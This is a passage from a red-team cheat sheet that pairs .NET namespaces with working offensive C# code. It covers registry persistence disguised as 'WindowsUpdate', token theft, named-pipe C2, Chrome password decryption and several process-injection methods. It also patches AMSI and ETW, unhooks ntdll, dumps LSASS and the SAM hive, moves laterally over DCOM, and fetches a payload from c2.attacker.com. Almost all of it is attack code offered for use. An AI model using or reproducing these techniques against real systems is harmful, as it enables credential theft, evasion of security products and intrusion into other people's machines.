byte[] imageBytes = ms.ToArray();

// ANNOTATE / HIDE data in image (basic steganography)
Bitmap cover = new Bitmap("innocent.png");
cover.SetPixel(0, 0, Color.FromArgb(255, 0, 0, 1));   // hide data in LSB
cover.Save("stego.png");

// READ pixel (extract hidden data)
Color px = cover.GetPixel(0, 0);
int hidden = px.B & 0x01;   // least significant bit
```

**Red Team use-cases:**
- Periodic desktop screenshots for surveillance / screen recording
- In-memory screenshot → direct C2 upload (no file on disk)
- Basic LSB steganography (hide data in images for exfil)

---

## `Microsoft.Win32` *(Registry)*

```csharp
using Microsoft.Win32;

// READ registry value
object val = Registry.GetValue(
    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion",
    "ProductName", null);
Console.WriteLine(val);

// WRITE — persistence (Run key)
Registry.SetValue(
    @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
    "WindowsUpdate",        // value name (disguised)
    @"C:\Temp\implant.exe"  // payload path
);

// OPEN a key for more control
using RegistryKey hklm = Registry.LocalMachine.OpenSubKey(
    @"SYSTEM\CurrentControlSet\Services", writable: true);

// CREATE a key
using RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\MyApp");
key.SetValue("Config", "encrypteddata");

// DELETE a key (clean up persistence)
Registry.CurrentUser.DeleteSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate");

// ENUMERATE all Run keys (recon for existing persistence)
using RegistryKey run = Registry.CurrentUser.OpenSubKey(
    @"Software\Microsoft\Windows\CurrentVersion\Run");
foreach (string name in run.GetValueNames())
    Console.WriteLine($"{name} = {run.GetValue(name)}");

// COMMON PERSISTENCE PATHS
// HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// HKLM\Software\Microsoft\Windows\CurrentVersion\Run
// HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
// HKLM\SYSTEM\CurrentControlSet\Services  (service persistence)
```

**Red Team use-cases:**
- Establish persistence via Run / RunOnce keys
- Enumerate existing persistence mechanisms
- Read security product configurations
- Service-based persistence via Services key

---

## `using System` — `Environment` class (advanced)

```csharp
using System;
using System.Collections;

// IDENTITY & MACHINE
Console.WriteLine(Environment.MachineName);          // hostname
Console.WriteLine(Environment.UserName);             // current user
Console.WriteLine(Environment.UserDomainName);       // domain name
Console.WriteLine(Environment.OSVersion);            // OS version
Console.WriteLine(Environment.Is64BitOperatingSystem);
Console.WriteLine(Environment.Is64BitProcess);
Console.WriteLine(Environment.ProcessorCount);

// PATHS (useful for staging)
string tmp     = Environment.GetFolderPath(Environment.SpecialFolder.Temp);
string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
string system32= Environment.GetFolderPath(Environment.SpecialFolder.System);
string winDir  = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

// ENVIRONMENT VARIABLES (recon for tokens, paths, credentials)
IDictionary envVars = Environment.GetEnvironmentVariables();
foreach (DictionaryEntry kv in envVars)
    Console.WriteLine($"{kv.Key} = {kv.Value}");

// LOOK for common secrets in env vars
string awsKey     = Environment.GetEnvironmentVariable("AWS_ACCESS_KEY_ID");
string ghToken    = Environment.GetEnvironmentVariable("GITHUB_TOKEN");
string azurePwd   = Environment.GetEnvironmentVariable("AZURE_CLIENT_SECRET");

// COMMAND LINE arguments
string[] args = Environment.GetCommandLineArgs();

// CLEAN EXIT (no exception trace)
Environment.Exit(0);

// SYSTEM UPTIME (sandbox check — newly booted VMs = sandbox)
long ticks   = Environment.TickCount64;
double hours = ticks / 1000.0 / 3600.0;
if (hours < 1.0) Environment.Exit(0);   // < 1 hour uptime → likely sandbox
```

**Red Team use-cases:**
- Harvest cloud provider tokens / API keys from environment variables
- Sandbox detection via uptime (`TickCount64 < 1hr`)
- Resolve writable staging paths (Temp, AppData)
- Distinguish domain-joined vs. workgroup machines

---

---

## `using System.Security.Principal`

```csharp
using System.Security.Principal;
using System.Runtime.InteropServices;

// CHECK current identity & privileges
WindowsIdentity identity = WindowsIdentity.GetCurrent();
Console.WriteLine($"User       : {identity.Name}");
Console.WriteLine($"Auth Type  : {identity.AuthenticationType}");
Console.WriteLine($"Is System  : {identity.IsSystem}");

WindowsPrincipal principal = new WindowsPrincipal(identity);
bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
Console.WriteLine($"Is Admin   : {isAdmin}");

// CHECK specific privilege (e.g. SeDebugPrivilege)
foreach (var group in identity.Groups)
    Console.WriteLine(group.Translate(typeof(NTAccount)));

// TOKEN IMPERSONATION — impersonate another user's token
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool RevertToSelf();

[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hToken);

[DllImport("advapi32.dll")]
static extern bool DuplicateToken(IntPtr hToken, int level, out IntPtr hNewToken);

// STEAL TOKEN from privileged process (e.g. SYSTEM process)
void StealToken(int targetPid)
{
    IntPtr hProc  = OpenProcess(0x001F0FFF, false, targetPid);  // PROCESS_ALL_ACCESS
    OpenProcessToken(hProc, 0x0002, out IntPtr hToken);          // TOKEN_DUPLICATE
    DuplicateToken(hToken, 2, out IntPtr hDupToken);
    ImpersonateLoggedOnUser(hDupToken);

    // Now running as the target user
    Console.WriteLine(WindowsIdentity.GetCurrent().Name);

    RevertToSelf();   // revert back
}

// ENABLE SeDebugPrivilege (required for LSASS access)
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool LookupPrivilegeValue(string host, string name, out LUID luid);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool AdjustTokenPrivileges(IntPtr hToken, bool disable,
    ref TOKEN_PRIVILEGES tp, int len, IntPtr prev, IntPtr retlen);

[StructLayout(LayoutKind.Sequential)]
struct LUID { public uint LowPart; public int HighPart; }

[StructLayout(LayoutKind.Sequential)]
struct TOKEN_PRIVILEGES
{
    public int PrivilegeCount;
    public LUID Luid;
    public int Attributes;   // SE_PRIVILEGE_ENABLED = 0x2
}

void EnableDebugPrivilege()
{
    OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,
                     0x0028, out IntPtr hToken);
    LookupPrivilegeValue(null, "SeDebugPrivilege", out LUID luid);
    var tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = 2 };
    AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
}

// RUN AS — create process under impersonated token
[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
static extern bool CreateProcessWithTokenW(IntPtr hToken, int logonFlags,
    string app, string cmdLine, int creationFlags,
    IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
```

**Red Team use-cases:**
- Token stealing from SYSTEM/privileged processes (privilege escalation)
- Impersonate domain users without credentials (lateral movement)
- Enable `SeDebugPrivilege` for LSASS access
- Spawn processes under stolen token context

---

## `using System.IO.Pipes`

```csharp
using System.IO.Pipes;
using System.Text;

// NAMED PIPE SERVER (C2 listener — SMB-based)
NamedPipeServerStream server = new NamedPipeServerStream(
    "MyPipeName",
    PipeDirection.InOut,
    1,
    PipeTransmissionMode.Message);

Console.WriteLine("Waiting for connection...");
server.WaitForConnection();
Console.WriteLine("Client connected.");

// READ command from client
byte[] buf = new byte[4096];
int bytes = server.Read(buf, 0, buf.Length);
string cmd = Encoding.UTF8.GetString(buf, 0, bytes);

// SEND response
byte[] response = Encoding.UTF8.GetBytes("output here");
server.Write(response, 0, response.Length);
server.Disconnect();

// NAMED PIPE CLIENT (implant connecting to C2)
using NamedPipeClientStream client = new NamedPipeClientStream(
    ".",             // server name ("." = local, or hostname for remote)
    "MyPipeName",
    PipeDirection.InOut);

client.Connect(5000);   // 5 second timeout

// SEND task result to C2
byte[] data = Encoding.UTF8.GetBytes("whoami_output_here");
client.Write(data, 0, data.Length);

// RECEIVE next command
byte[] recv = new byte[4096];
int n = client.Read(recv, 0, recv.Length);
string command = Encoding.UTF8.GetString(recv, 0, n);

// REMOTE PIPE (lateral movement — connect to pipe on another host)
using NamedPipeClientStream remote = new NamedPipeClientStream(
    "TARGET-PC",     // remote hostname
    "MyPipeName",
    PipeDirection.InOut,
    PipeOptions.None,
    System.Security.Principal.TokenImpersonationLevel.Impersonation);
remote.Connect();

// ANONYMOUS PIPE (parent-child process IPC)
using AnonymousPipeServerStream anonServer =
    new AnonymousPipeServerStream(PipeDirection.Out, HandleInheritability.Inheritable);
string clientHandle = anonServer.GetClientHandleAsString();
// pass clientHandle to child process as argument
```

**Red Team use-cases:**
- SMB-based C2 channel (blends with legitimate traffic on port 445)
- Lateral movement via remote named pipe connections
- Inter-process communication between loader and payload
- Cobalt Strike SMB beacon equivalent pattern

---

## `System.Security` — DPAPI / `ProtectedData`

```csharp
using System.Security.Cryptography;
using System.Security;
using System.Text;

// DPAPI ENCRYPT (Windows ties encryption to current user/machine)
byte[] plaintext  = Encoding.UTF8.GetBytes("sensitive data");
byte[] entropy    = Encoding.UTF8.GetBytes("optional-extra-entropy");

// USER scope — only same user can decrypt
byte[] encrypted  = ProtectedData.Protect(plaintext, entropy,
                        DataProtectionScope.CurrentUser);

// MACHINE scope — any user on same machine can decrypt
byte[] encMachine = ProtectedData.Protect(plaintext, null,
                        DataProtectionScope.LocalMachine);

// DPAPI DECRYPT
byte[] decrypted  = ProtectedData.Unprotect(encrypted, entropy,
                        DataProtectionScope.CurrentUser);
Console.WriteLine(Encoding.UTF8.GetString(decrypted));

// EXTRACT CHROME PASSWORDS (uses DPAPI v10 + AES-GCM in modern Chrome)
// Chrome stores master key in: %LOCALAPPDATA%\Google\Chrome\User Data\Local State
string localState = File.ReadAllText(
    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
    @"Google\Chrome\User Data\Local State"));

// Parse JSON → get "encrypted_key" → Base64 decode → strip "DPAPI" prefix → Unprotect
// (simplified; use System.Text.Json or Newtonsoft for real parsing)
string b64Key = /* parse "os_crypt.encrypted_key" from JSON */ "";
byte[] encKey = Convert.FromBase64String(b64Key);
byte[] keyBytes = encKey[5..];   // skip "DPAPI" prefix (5 bytes)
byte[] masterKey = ProtectedData.Unprotect(keyBytes, null, DataProtectionScope.CurrentUser);

// CHROME LOGIN DB — located at:
// %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data  (SQLite)
// Columns: origin_url, username_value, password_value (DPAPI or AES-GCM encrypted)

// SECURESTRING (handle sensitive data in memory)
SecureString ss = new SecureString();
foreach (char c in "P@ssw0rd") ss.AppendChar(c);
ss.MakeReadOnly();

// Convert SecureString back to plain (for use)
IntPtr ptr = System.Runtime.InteropServices.Marshal.SecureStringToGlobalAllocUnicode(ss);
string plain = System.Runtime.InteropServices.Marshal.PtrToStringUni(ptr);
System.Runtime.InteropServices.Marshal.ZeroFreeGlobalAllocUnicode(ptr);
```

**Red Team use-cases:**
- Decrypt Chrome / Edge / Firefox saved passwords (DPAPI-protected)
- Decrypt Windows Credential Manager entries
- Decrypt WiFi passwords stored by Windows
- Understand how defenders protect secrets (to find weaknesses)

---

## Advanced Injection Techniques

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

// ── P/INVOKE DECLARATIONS ──────────────────────────────────────────────────

[DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int pid);
[DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, uint sz, uint type, uint prot);
[DllImport("kernel32.dll")] static extern bool   WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, uint sz, out int written);
[DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr tid);
[DllImport("kernel32.dll")] static extern bool   VirtualProtectEx(IntPtr h, IntPtr addr, uint sz, uint newProt, out uint oldProt);
[DllImport("ntdll.dll")]    static extern uint   NtQueueApcThread(IntPtr hThread, IntPtr func, IntPtr a1, IntPtr a2, IntPtr a3);
[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hMod, string proc);
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string mod);
[DllImport("kernel32.dll")] static extern bool   ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, uint sz, out int read);
[DllImport("kernel32.dll")] static extern IntPtr ZwUnmapViewOfSection(IntPtr h, IntPtr addr);
[DllImport("kernel32.dll")] static extern bool   ResumeThread(IntPtr hThread);
[DllImport("kernel32.dll")] static extern bool   SuspendThread(IntPtr hThread);
[DllImport("kernel32.dll")] static extern bool   GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
[DllImport("kernel32.dll")] static extern bool   SetThreadContext(IntPtr hThread, ref CONTEXT ctx);

// ── 1. CLASSIC REMOTE INJECTION (CreateRemoteThread) ──────────────────────
void RemoteInject(int pid, byte[] shellcode)
{
    IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
    IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
    WriteProcessMemory(hProc, mem, shellcode, (uint)shellcode.Length, out _);
    CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
}

// ── 2. PROCESS HOLLOWING ──────────────────────────────────────────────────
// 1) Spawn a legitimate process SUSPENDED (e.g. svchost.exe)
// 2) Unmap its memory
// 3) Write our payload PE into the same virtual address
// 4) Fix headers, relocations, imports
// 5) Resume thread → runs our payload under legit process identity
void ProcessHollow(string targetPath, byte[] payloadPE)
{
    var si = new STARTUPINFO();
    si.cb  = Marshal.SizeOf(si);
    CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false,
                  0x4 /*CREATE_SUSPENDED*/, IntPtr.Zero, null, ref si, out var pi);

    // Unmap legitimate image
    ZwUnmapViewOfSection(pi.hProcess, /* base address from PEB */ IntPtr.Zero);

    // Allocate space and write payload PE
    IntPtr mem = VirtualAllocEx(pi.hProcess, /* preferred base */ IntPtr.Zero,
                                (uint)payloadPE.Length, 0x3000, 0x40);
    WriteProcessMemory(pi.hProcess, mem, payloadPE, (uint)payloadPE.Length, out _);

    // Update RCX (entry point) in thread context then resume
    ResumeThread(pi.hThread);
}

// ── 3. APC INJECTION (Early Bird) ─────────────────────────────────────────
// Queue shellcode as APC to a thread BEFORE it starts (alertable state)
// Early Bird = inject during process creation, before any AV hooks load
void ApcInject(int pid, byte[] shellcode)
{
    IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
    IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
    WriteProcessMemory(hProc, mem, shellcode, (uint)shellcode.Length, out _);

    // Queue APC to every thread of target process
    var proc = Process.GetProcessById(pid);
    foreach (ProcessThread t in proc.Threads)
    {
        IntPtr hThread = OpenThread(0x0010 /*THREAD_SET_CONTEXT*/, false, (uint)t.Id);
        NtQueueApcThread(hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
    }
}

// ── 4. DLL INJECTION (LoadLibrary) ────────────────────────────────────────
void DllInject(int pid, string dllPath)
{
    IntPtr hProc     = OpenProcess(0x001F0FFF, false, pid);
    IntPtr loadLib   = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    uint   size      = (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char)));
    IntPtr mem       = VirtualAllocEx(hProc, IntPtr.Zero, size, 0x3000, 0x04);
    byte[] dllBytes  = System.Text.Encoding.Default.GetBytes(dllPath);
    WriteProcessMemory(hProc, mem, dllBytes, size, out _);
    CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, mem, 0, IntPtr.Zero);
}

// ── 5. THREAD HIJACKING ────────────────────────────────────────────────────
// Suspend a thread → overwrite RIP (instruction pointer) → resume
void ThreadHijack(int tid, byte[] shellcode)
{
    IntPtr hThread = OpenThread(0x001F03FF, false, (uint)tid);
    SuspendThread(hThread);

    var ctx = new CONTEXT { ContextFlags = 0x10000B };  // CONTEXT_AMD64
    GetThreadContext(hThread, ref ctx);

    // Save original RIP, point RIP to shellcode, restore after exec
    // (requires VirtualAllocEx in target process first)
    // ctx.Rip = (ulong)shellcodeMem;
    SetThreadContext(hThread, ref ctx);
    ResumeThread(hThread);
}

[DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
[DllImport("kernel32.dll")] static extern bool CreateProcess(string app, string cmd,
    IntPtr pAttr, IntPtr tAttr, bool inherit, uint flags,
    IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

[StructLayout(LayoutKind.Sequential)] struct STARTUPINFO  { public int cb; /* ... */ }
[StructLayout(LayoutKind.Sequential)] struct PROCESS_INFORMATION
{
    public IntPtr hProcess, hThread;
    public int dwProcessId, dwThreadId;
}
[StructLayout(LayoutKind.Sequential, Pack = 16)] struct CONTEXT
{
    public ulong ContextFlags;
    // ... (full CONTEXT struct — 1232 bytes on x64)
    public ulong Rip;   // instruction pointer
}
```

**Red Team use-cases:**
- `CreateRemoteThread` — classic remote injection (noisy, detected by most EDRs)
- `Process Hollowing` — payload runs under legitimate process name/path
- `APC / Early Bird` — inject before EDR hooks load, evades many solutions
- `DLL Injection` — load malicious DLL into target process address space
- `Thread Hijacking` — hijack existing thread (no new thread creation = less noise)

---

## EDR / AV Evasion Techniques

```csharp
using System;
using System.Runtime.InteropServices;
using System.Text;

// ── 1. AMSI BYPASS — patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN ──
void PatchAmsi()
{
    // AmsiScanBuffer returns 1 (AMSI_RESULT_CLEAN) when patched
    // patch bytes: mov eax, 0x80070057 ; ret  (return error → AMSI disabled)
    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    IntPtr lib  = LoadLibrary("amsi.dll");
    IntPtr func = GetProcAddress(lib, "AmsiScanBuffer");

    VirtualProtect(func, (uint)patch.Length, 0x40, out uint old);
    Marshal.Copy(patch, 0, func, patch.Length);
    VirtualProtect(func, (uint)patch.Length, old, out _);
}

// ── 2. ETW BYPASS — patch EtwEventWrite to return immediately ──────────────
void PatchEtw()
{
    // ret instruction: just return immediately, no events logged
    byte[] patch = { 0xC3 };

    IntPtr ntdll = GetModuleHandle("ntdll.dll");
    IntPtr func  = GetProcAddress(ntdll, "EtwEventWrite");

    VirtualProtect(func, 1, 0x40, out uint old);
    Marshal.Copy(patch, 0, func, 1);
    VirtualProtect(func, 1, old, out _);
}

// ── 3. UNHOOK NTDLL — restore hooked syscalls from clean copy on disk ───────
void UnhookNtdll()
{
    // EDRs hook ntdll.dll functions in memory to intercept syscalls.
    // Fix: read the clean .text section from disk and overwrite the hooked one.
    string ntdllPath = @"C:\Windows\System32\ntdll.dll";
    byte[] freshDll  = File.ReadAllBytes(ntdllPath);

    IntPtr hNtdll = GetModuleHandle("ntdll.dll");

    // Parse PE headers to find .text section offset & size
    // (simplified — real impl parses IMAGE_SECTION_HEADER)
    int e_lfanew    = BitConverter.ToInt32(freshDll, 0x3C);
    int textOffset  = /* parse from section headers */ 0x1000;
    int textSize    = /* parse from section headers */ 0x90000;

    IntPtr textAddr = IntPtr.Add(hNtdll, textOffset);
    VirtualProtect(textAddr, (uint)textSize, 0x40, out uint old);
    Marshal.Copy(freshDll, textOffset, textAddr, textSize);
    VirtualProtect(textAddr, (uint)textSize, old, out _);
}

// ── 4. DIRECT SYSCALLS — bypass userland hooks by calling kernel directly ───
// Instead of calling NtAllocateVirtualMemory (which EDR may hook),
// execute the syscall instruction directly with the syscall number.
// Syscall numbers change per Windows version — resolve dynamically.

// Example: NtAllocateVirtualMemory syscall stub (x64)
// mov r10, rcx
// mov eax, <syscall_number>
// syscall
// ret
byte[] GetSyscallStub(int syscallNumber)
{
    return new byte[]
    {
        0x4C, 0x8B, 0xD1,              // mov r10, rcx
        0xB8, (byte)syscallNumber,      // mov eax, <number>
              0x00, 0x00, 0x00,
        0x0F, 0x05,                     // syscall
        0xC3                            // ret
    };
}

// Resolve syscall number dynamically from ntdll (before hooks)
int GetSyscallNumber(string funcName)
{
    IntPtr ntdll = GetModuleHandle("ntdll.dll");
    IntPtr func  = GetProcAddress(ntdll, funcName);
    // Read 5th byte = syscall number (mov eax, XX)
    byte[] stub  = new byte[8];
    Marshal.Copy(func, stub, 0, 8);
    return stub[4];   // works for most NT functions
}

// ── 5. STRING OBFUSCATION (evade static string scanning) ───────────────────
// XOR-encode sensitive strings at compile time, decode at runtime
string XorDecrypt(byte[] data, byte key)
{
    var sb = new StringBuilder();
    foreach (byte b in data)
        sb.Append((char)(b ^ key));
    return sb.ToString();
}
// Instead of "amsi.dll" in plain text:
byte[] encoded = { 0xC0, 0xED, 0xCC, 0xD1, 0xAB, 0xCC, 0xCC };  // XOR'd with 0xA1
string decoded = XorDecrypt(encoded, 0xA1);   // → "amsi.dll"

// ── 6. SLEEP OBFUSCATION (encrypt payload while sleeping) ──────────────────
// While beaconing, encrypt implant's own memory to evade memory scanning
void SleepObfuscated(int milliseconds, byte[] key)
{
    // XOR encrypt our own .text section in memory
    // sleep
    // XOR decrypt back before waking
    // (requires knowing our own module base — advanced technique)
    Thread.Sleep(milliseconds);   // simplified placeholder
}

[DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string name);
[DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
[DllImport("kernel32.dll")] static extern bool   VirtualProtect(IntPtr addr, uint size, uint newProt, out uint oldProt);
```

**Red Team use-cases:**
- AMSI patch → bypass PowerShell / .NET script scanning
- ETW patch → stop event tracing (blind Sysmon, Defender)
- ntdll unhooking → restore EDR-hooked functions to originals
- Direct syscalls → go below userland hooks entirely
- String obfuscation → evade static signature detection
- Sleep obfuscation → evade memory-scanning EDRs (CrowdStrike, SentinelOne)

---

## Credential Access — LSASS & SAM

```csharp
using System;
using System.Runtime.InteropServices;
using System.IO;

// ── 1. MINIDUMP LSASS (dump credentials from memory) ─────────────────────
[DllImport("dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId,
    IntPtr hFile, uint dumpType,
    IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);

[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

void DumpLsass(string outputPath)
{
    // Requires SeDebugPrivilege (run as admin or with stolen token)
    var lsass = System.Diagnostics.Process.GetProcessesByName("lsass")[0];
    IntPtr hProc = OpenProcess(0x001F0FFF, false, lsass.Id);

    using FileStream fs = new FileStream(outputPath, FileMode.Create);
    // dumpType 2 = MiniDumpWithFullMemory
    MiniDumpWriteDump(hProc, (uint)lsass.Id, fs.SafeFileHandle.DangerousGetHandle(),
                      2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

    Console.WriteLine($"LSASS dumped to {outputPath}");
    // Transfer dump to attacker machine → parse with Mimikatz / pypykatz
}

// ── 2. SILENT PROCESS EXIT / COMSVCS DUMP (LOLbin — no dbghelp needed) ──
// Use comsvcs.dll MiniDump export via rundll32 (avoid P/Invoke to dbghelp):
// rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
void ComsvcsDump(int lsassPid)
{
    var psi = new System.Diagnostics.ProcessStartInfo
    {
        FileName               = "rundll32.exe",
        Arguments              = $"C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsassPid} C:\\Temp\\lsass.dmp full",
        UseShellExecute        = false,
        CreateNoWindow         = true
    };
    System.Diagnostics.Process.Start(psi).WaitForExit();
}

// ── 3. SAM / SYSTEM HIVE DUMP (offline credential extraction) ─────────────
// VSS shadow copy trick — copy SAM/SYSTEM even while Windows has them locked
void DumpSamVss()
{
    // Create shadow copy
    var sc = new System.Management.ManagementClass(@"\\.\root\cimv2:Win32_ShadowCopy");
    var inParams = sc.GetMethodParameters("Create");
    inParams["Volume"] = "C:\\";
    inParams["Context"] = "ClientAccessible";
    var result = sc.InvokeMethod("Create", inParams, null);

    string shadowId   = result["ShadowID"].ToString();
    string shadowPath = /* query Win32_ShadowCopy by ID to get DeviceObject */ "";

    // Copy hives from shadow
    File.Copy($@"{shadowPath}\Windows\System32\config\SAM",    @"C:\Temp\SAM");
    File.Copy($@"{shadowPath}\Windows\System32\config\SYSTEM", @"C:\Temp\SYSTEM");
    File.Copy($@"{shadowPath}\Windows\System32\config\SECURITY", @"C:\Temp\SECURITY");
    // Parse offline with secretsdump.py / samdump2
}

// ── 4. CREDENTIAL MANAGER — enumerate stored credentials ──────────────────
[DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Unicode)]
static extern bool CredEnumerate(string filter, int flags,
    out int count, out IntPtr pCreds);

[DllImport("advapi32.dll")]
static extern void CredFree(IntPtr buffer);

void EnumerateCredentials()
{
    CredEnumerate(null, 0, out int count, out IntPtr pCreds);
    // Parse CREDENTIAL structs from pCreds (advanced marshalling required)
    Console.WriteLine($"Found {count} stored credentials");
    CredFree(pCreds);
}

// ── 5. NTLM HASH from password (for pass-the-hash) ────────────────────────
byte[] NtlmHash(string password)
{
    byte[] unicodePass = System.Text.Encoding.Unicode.GetBytes(password);
    using var md4 = /* MD4 not in BCL — use custom impl or BouncyCastle */
        System.Security.Cryptography.MD5.Create();   // placeholder — use MD4
    return md4.ComputeHash(unicodePass);
    // Real NTLM: MD4(UTF-16LE(password))
}
```

**Red Team use-cases:**
- LSASS minidump → extract plaintext passwords / NTLM hashes with Mimikatz offline
- SAM+SYSTEM hive dump → crack local account hashes offline
- Credential Manager enumeration → find saved RDP / web credentials
- NTLM hash computation → pass-the-hash attacks

---

## COM Interop & DCOM Lateral Movement

```csharp
using System;
using System.Runtime.InteropServices;

// ── 1. INSTANTIATE COM OBJECT (LOLbin execution) ──────────────────────────
// Use COM to spawn processes — avoids direct Process.Start calls
Type shellType   = Type.GetTypeFromProgID("WScript.Shell");
dynamic wsh      = Activator.CreateInstance(shellType);
wsh.Run("cmd.exe /c whoami > C:\\Temp\\out.txt", 0, false);   // 0 = hidden

// INTERNET EXPLORER COM (deprecated but still on many systems)
Type ieType = Type.GetTypeFromProgID("InternetExplorer.Application");
dynamic ie  = Activator.CreateInstance(ieType);
ie.Visible  = false;
ie.Navigate("http://c2.attacker.com/payload.txt");

// EXCEL COM (macro execution via COM)
Type excelType = Type.GetTypeFromProgID("Excel.Application");
dynamic excel  = Activator.CreateInstance(excelType);
excel.Visible  = false;
var wb = excel.Workbooks.Open(@"C:\Temp\macro.xlsm");
excel.Run("MacroName");

// ── 2. DCOM LATERAL MOVEMENT ──────────────────────────────────────────────
// MMC20.Application — classic DCOM lateral movement (no SMB/PSExec needed)
// Requires: local admin on target, DCOM enabled (default on Windows)
Type mmcType = Type.GetTypeFromProgID("MMC20.Application", "TARGET-PC");
dynamic mmc  = Activator.CreateInstance(mmcType);
mmc.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",                   // command
    null,                        // directory
    "/c whoami > C:\\Temp\\o",  // args
    "7"                          // hidden window
);

// ShellWindows DCOM (alternative — harder to detect)
Type swType  = Type.GetTypeFromCLSID(
    new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), "TARGET-PC");
dynamic sw   = Activator.CreateInstance(swType);
var item     = sw.Item();
var doc      = item.Document;
var app      = doc.Application;
app.ShellExecute("cmd.exe", "/c calc.exe", @"C:\Windows\System32", null, 0);

// ── 3. WMIC via COM (alternative to System.Management) ────────────────────
Type wmicType = Type.GetTypeFromProgID("WbemScripting.SWbemLocator");
dynamic locator = Activator.CreateInstance(wmicType);
dynamic service = locator.ConnectServer("TARGET-PC", "root\\cimv2", "user", "pass");
var procs = service.ExecQuery("SELECT * FROM Win32_Process");
foreach (var proc in procs)
    Console.WriteLine($"{proc.ProcessId} {proc.Name}");

// ── 4. SCHEDULED TASK via COM (persistence + lateral movement) ────────────
Type schedType = Type.GetTypeFromProgID("Schedule.Service");
dynamic sched  = Activator.CreateInstance(schedType);
sched.Connect("TARGET-PC", null, null, null);
dynamic rootFolder = sched.GetFolder("\\");
dynamic taskDef    = sched.NewTask(0);
taskDef.RegistrationInfo.Description = "Windows Update Helper";
// Add trigger (at logon / at startup)
var trigger = taskDef.Triggers.Create(9);   // 9 = TASK_TRIGGER_BOOT
// Add action
var action  = taskDef.Actions.Create(0);    // 0 = TASK_ACTION_EXEC
action.Path = @"C:\Temp\implant.exe";
rootFolder.RegisterTaskDefinition(
    "WindowsUpdateHelper", taskDef, 6, null, null, 3, null);
```

**Red Team use-cases:**
- WScript.Shell → execute commands without `Process.Start` (evades some monitoring)
- DCOM MMC20 / ShellWindows → lateral movement without SMB, PSExec, or WMI
- Scheduled Task via COM → persistent execution on local or remote machine
- Excel/Office COM → macro execution, phishing post-exploitation

---

## `using System.IdentityModel` — Kerberos & Token Concepts

```csharp
using System.IdentityModel.Tokens;
using System.IdentityModel.Selectors;
using System.Security.Principal;

// NOTE: Full Kerberos ticket manipulation requires P/Invoke to SSPI / LSA.
// System.IdentityModel provides the managed wrapper concepts.

// ── 1. KERBEROS AUTHENTICATION CHECK ──────────────────────────────────────
WindowsIdentity id = WindowsIdentity.GetCurrent();
Console.WriteLine($"Auth Type: {id.AuthenticationType}");   // "Kerberos" or "NTLM"

// ── 2. S4U2SELF — get service ticket for another user (no password) ────────
